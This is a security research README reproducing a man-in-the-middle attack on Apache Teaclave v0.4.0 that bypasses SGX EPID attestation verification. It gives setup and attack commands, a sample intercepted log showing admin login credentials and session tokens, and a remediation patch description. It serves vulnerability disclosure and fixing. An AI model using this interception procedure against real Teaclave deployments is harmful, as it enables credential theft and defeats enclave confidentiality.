# SGX attestation bypass vulnerability on Teaclave

This repository contains the code to reproduce our MITM attack on Teaclave services.

## Steps to reproduce

Setup Teaclave v0.4.0 following the official instructions at <https://teaclave.apache.org/docs/my-first-function/>
For reproducibility select v0.4.0 version with `git checkout v0.4.0` after cloning the Teaclave repo.

Note: this attack is an EPID attestation verification bypass, therefore you need the right SGX hardware to reproduce it.

```
# Clone the Teaclave repository
$ git clone https://github.com/apache/incubator-teaclave.git
$ cd incubator-teaclave/
$ git checkout v0.4.0

# Build the Teaclave platform using docker
$ docker run --rm -v $(pwd):/teaclave -w /teaclave \
    -it teaclave/teaclave-build-ubuntu-2004-sgx-2.15.1:latest \
    bash -c ". /root/.cargo/env && \
        . /opt/sgxsdk/environment && \
        mkdir -p build && cd build && \
        cmake -DTEST_MODE=ON .. && \
        make"

# Replace with your credentials from https://api.portal.trustedservices.intel.com/EPID-attestation
$ export AS_SPID="00000000000000000000000000000000"  # SPID from IAS subscription
$ export AS_KEY="00000000000000000000000000000000"   # Primary key/Secondary key from IAS subscription
$ export AS_ALGO="sgx_epid"                          # Attestation algorithm, sgx_epid for IAS
$ export AS_URL="https://api.trustedservices.intel.com:443"    # IAS URL

# Start the Teaclave services
$ (cd docker && ./run-teaclave-services.sh)

# Setup the Teaclave Python examples
$ cd examples/python
$ python3 -m venv env
$ source env/bin/activate
$ pip install -U pip
$ pip install pyopenssl toml cryptography
```

Run the run the echo example to check everything works fine.

``` 
cd examples/python
$ PYTHONPATH=../../sdk/python python3 builtin_echo.py 'Hello, Teaclave!'
[+] registering user
[+] login
[+] registering function
[+] creating task
[+] approving task
[+] invoking task
[+] getting result
[+] done
[+] function return:  b'Hello, Teaclave!'
```

Apply the patch to change the ports the examples will use to connect to Teaclave services so that they connect to the services operated by the attacker instead.

```
# Go back to the root of incubator-teaclave git repo
cd ../../
git apply  ../change_client_conn_ports.patch
``` 

Now in another terminal, we can lauch the MITM attack. 

```
# Go to the root of this repo (where this README.md is located)
# Activate the Teaclave Python environment
$ source incubator-teaclave/examples/python/env/bin/activate
$ chmod +x main.py
$ ./main.py
⚡ Starting MITM attack
🔌 MITM proxy listening on ('localhost', 8776), relaying to ('localhost', 7776)
🔌 MITM proxy listening on ('localhost', 8777), relaying to ('localhost', 7777)
```

On the first terminal re-run the echo example. Don't forget to you need to be in Python environment created previously.
``` 
$ cd examples/python
$ PYTHONPATH=../../sdk/python python3 builtin_echo.py 'Hello, Teaclave!'
[+] registering user
[+] login
[+] registering function
[+] creating task
[+] approving task
[+] invoking task
[+] getting result
[+] done
[+] function return:  b'Hello, Teaclave!'
```
You should observe the same behavior as before. But now if you observe the output of the MITM script you should see all the traffic that have been exchanged by the client and the (genuine) Teaclave service.

Sample of traffic log : 
```
⚡ Starting MITM attack
🔌 MITM proxy listening on ('localhost', 8776), relaying to ('localhost', 7776)
🔌 MITM proxy listening on ('localhost', 8777), relaying to ('localhost', 7777)
[Client/authentication] {'message': {'user_login': {'id': 'admin', 'password': 'teaclave'}}}
[Teaclave/authentication] {'result': 'ok', 'response': 'user_login', 'content': {'token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJQbGF0Zm9ybUFkbWluIiwiaXNzIjoiVGVhY2xhdmUiLCJleHAiOjE2NTU1NjE1MzB9.vK3OeuPrxw-cyYkEtUcDZwPoZ79Mr6h5gnXEhn9bmxmXEvx5qomocEVCzjdSwY5lUoav8FmF10WzlyhJieLj4Q'}}
[Client/frontend] {'message': {'register_function': {'name': 'builtin-echo', 'description': 'Native Echo Function', 'executor_type': 'builtin', 'public': True, 'payload': [], 'arguments': ['message'], 'inputs': [], 'outputs': [], 'user_allowlist': []}}, 'metadata': {'id': 'admin', 'token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJQbGF0Zm9ybUFkbWluIiwiaXNzIjoiVGVhY2xhdmUiLCJleHAiOjE2NTU1NjE1MzB9.vK3OeuPrxw-cyYkEtUcDZwPoZ79Mr6h5gnXEhn9bmxmXEvx5qomocEVCzjdSwY5lUoav8FmF10WzlyhJieLj4Q'}}
[Teaclave/frontend] {'result': 'ok', 'response': 'register_function', 'content': {'function_id': 'function-6eaf078b-3ea5-40d0-b320-b9f6f45fbe78'}}
[Client/frontend] {'message': {'create_task': {'function_id': 'function-6eaf078b-3ea5-40d0-b320-b9f6f45fbe78', 'function_arguments': '{"message": "Hello, Teaclave!"}', 'executor': 'builtin', 'inputs_ownership': [], 'outputs_ownership': []}}, 'metadata': {'id': 'admin', 'token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJQbGF0Zm9ybUFkbWluIiwiaXNzIjoiVGVhY2xhdmUiLCJleHAiOjE2NTU1NjE1MzB9.vK3OeuPrxw-cyYkEtUcDZwPoZ79Mr6h5gnXEhn9bmxmXEvx5qomocEVCzjdSwY5lUoav8FmF10WzlyhJieLj4Q'}}
[Teaclave/frontend] {'result': 'ok', 'response': 'create_task', 'content': {'task_id': 'task-c2ed0a1d-e880-4d68-84d6-057b982ea116'}}
[Client/frontend] {'message': {'invoke_task': {'task_id': 'task-c2ed0a1d-e880-4d68-84d6-057b982ea116'}}, 'metadata': {'id': 'admin', 'token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJQbGF0Zm9ybUFkbWluIiwiaXNzIjoiVGVhY2xhdmUiLCJleHAiOjE2NTU1NjE1MzB9.vK3OeuPrxw-cyYkEtUcDZwPoZ79Mr6h5gnXEhn9bmxmXEvx5qomocEVCzjdSwY5lUoav8FmF10WzlyhJieLj4Q'}}
[Teaclave/frontend] {'result': 'ok', 'response': 'invoke_task', 'content': {}}
[Client/frontend] {'message': {'get_task': {'task_id': 'task-c2ed0a1d-e880-4d68-84d6-057b982ea116'}}, 'metadata': {'id': 'admin', 'token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJQbGF0Zm9ybUFkbWluIiwiaXNzIjoiVGVhY2xhdmUiLCJleHAiOjE2NTU1NjE1MzB9.vK3OeuPrxw-cyYkEtUcDZwPoZ79Mr6h5gnXEhn9bmxmXEvx5qomocEVCzjdSwY5lUoav8FmF10WzlyhJieLj4Q'}}
[Teaclave/frontend] {'result': 'ok', 'response': 'get_task', 'content': {'task_id': 'task-c2ed0a1d-e880-4d68-84d6-057b982ea116', 'creator': 'admin', 'function_id': 'function-6eaf078b-3ea5-40d0-b320-b9f6f45fbe78', 'function_owner': 'admin', 'function_arguments': '{"message":"Hello, Teaclave!"}', 'inputs_ownership': [], 'outputs_ownership': [], 'participants': ['admin'], 'approved_users': [], 'assigned_inputs': [], 'assigned_outputs': [], 'status': 3, 'result': {'result': None}}}
[Client/frontend] {'message': {'get_task': {'task_id': 'task-c2ed0a1d-e880-4d68-84d6-057b982ea116'}}, 'metadata': {'id': 'admin', 'token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJQbGF0Zm9ybUFkbWluIiwiaXNzIjoiVGVhY2xhdmUiLCJleHAiOjE2NTU1NjE1MzB9.vK3OeuPrxw-cyYkEtUcDZwPoZ79Mr6h5gnXEhn9bmxmXEvx5qomocEVCzjdSwY5lUoav8FmF10WzlyhJieLj4Q'}}
[Teaclave/frontend] {'result': 'ok', 'response': 'get_task', 'content': {'task_id': 'task-c2ed0a1d-e880-4d68-84d6-057b982ea116', 'creator': 'admin', 'function_id': 'function-6eaf078b-3ea5-40d0-b320-b9f6f45fbe78', 'function_owner': 'admin', 'function_arguments': '{"message":"Hello, Teaclave!"}', 'inputs_ownership': [], 'outputs_ownership': [], 'participants': ['admin'], 'approved_users': [], 'assigned_inputs': [], 'assigned_outputs': [], 'status': 4, 'result': {'result': None}}}
[Client/frontend] {'message': {'get_task': {'task_id': 'task-c2ed0a1d-e880-4d68-84d6-057b982ea116'}}, 'metadata': {'id': 'admin', 'token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJQbGF0Zm9ybUFkbWluIiwiaXNzIjoiVGVhY2xhdmUiLCJleHAiOjE2NTU1NjE1MzB9.vK3OeuPrxw-cyYkEtUcDZwPoZ79Mr6h5gnXEhn9bmxmXEvx5qomocEVCzjdSwY5lUoav8FmF10WzlyhJieLj4Q'}}
[Teaclave/frontend] {'result': 'ok', 'response': 'get_task', 'content': {'task_id': 'task-c2ed0a1d-e880-4d68-84d6-057b982ea116', 'creator': 'admin', 'function_id': 'function-6eaf078b-3ea5-40d0-b320-b9f6f45fbe78', 'function_owner': 'admin', 'function_arguments': '{"message":"Hello, Teaclave!"}', 'inputs_ownership': [], 'outputs_ownership': [], 'participants': ['admin'], 'approved_users': [], 'assigned_inputs': [], 'assigned_outputs': [], 'status': 4, 'result': {'result': None}}}
[Client/frontend] {'message': {'get_task': {'task_id': 'task-c2ed0a1d-e880-4d68-84d6-057b982ea116'}}, 'metadata': {'id': 'admin', 'token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJQbGF0Zm9ybUFkbWluIiwiaXNzIjoiVGVhY2xhdmUiLCJleHAiOjE2NTU1NjE1MzB9.vK3OeuPrxw-cyYkEtUcDZwPoZ79Mr6h5gnXEhn9bmxmXEvx5qomocEVCzjdSwY5lUoav8FmF10WzlyhJieLj4Q'}}
[Teaclave/frontend] {'result': 'ok', 'response': 'get_task', 'content': {'task_id': 'task-c2ed0a1d-e880-4d68-84d6-057b982ea116', 'creator': 'admin', 'function_id': 'function-6eaf078b-3ea5-40d0-b320-b9f6f45fbe78', 'function_owner': 'admin', 'function_arguments': '{"message":"Hello, Teaclave!"}', 'inputs_ownership': [], 'outputs_ownership': [], 'participants': ['admin'], 'approved_users': [], 'assigned_inputs': [], 'assigned_outputs': [], 'status': 4, 'result': {'result': None}}}
[Client/frontend] {'message': {'get_task': {'task_id': 'task-c2ed0a1d-e880-4d68-84d6-057b982ea116'}}, 'metadata': {'id': 'admin', 'token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJQbGF0Zm9ybUFkbWluIiwiaXNzIjoiVGVhY2xhdmUiLCJleHAiOjE2NTU1NjE1MzB9.vK3OeuPrxw-cyYkEtUcDZwPoZ79Mr6h5gnXEhn9bmxmXEvx5qomocEVCzjdSwY5lUoav8FmF10WzlyhJieLj4Q'}}
[Teaclave/frontend] {'result': 'ok', 'response': 'get_task', 'content': {'task_id': 'task-c2ed0a1d-e880-4d68-84d6-057b982ea116', 'creator': 'admin', 'function_id': 'function-6eaf078b-3ea5-40d0-b320-b9f6f45fbe78', 'function_owner': 'admin', 'function_arguments': '{"message":"Hello, Teaclave!"}', 'inputs_ownership': [], 'outputs_ownership': [], 'participants': ['admin'], 'approved_users': [], 'assigned_inputs': [], 'assigned_outputs': [], 'status': 10, 'result': {'result': {'Ok': {'return_value': [72, 101, 108, 108, 111, 44, 32, 84, 101, 97, 99, 108, 97, 118, 101, 33], 'tags_map': {}}}}}}
```

## Remediation

`fix.patch` contains a patch to apply on master (commit: 2ed0f17a02035b39e3bdaaf84927b99e7534ba36). 
It adds the missing check that is needed to make sure that the certificate's pub key is equal to the pub key embedded in the SGX enclave report.

Use `git apply fix.patch` to apply it on your working directory.